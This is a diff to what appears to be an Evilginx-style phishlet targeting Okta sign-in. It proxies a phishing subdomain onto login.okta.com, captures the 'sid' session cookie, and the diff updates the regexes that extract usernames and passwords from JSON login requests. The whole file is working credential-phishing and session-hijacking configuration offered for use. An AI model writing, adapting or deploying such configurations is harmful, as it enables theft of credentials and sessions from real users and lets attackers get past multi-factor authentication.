@@ -1,4 +1,4 @@
-author: '@mikesiegel'
+author: '@jack_halon'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: false, is_landing: false}
@@ -10,13 +10,13 @@ auth_tokens:
     keys: ['sid']
 credentials:
   username:
-    key: 'email'
-    search: '(.*)'
-    type: 'post'
+    key: 'username'
+    search: '"username":"([^"]*)'
+    type: 'json'
   password:
     key: 'password'
-    search: '(.*)'
-    type: 'post'
+    search: '"password":"([^"]*)'
+    type: 'json'
 login:
   domain: 'EXAMPLE.okta.com'
   path: '/login/login.htm'
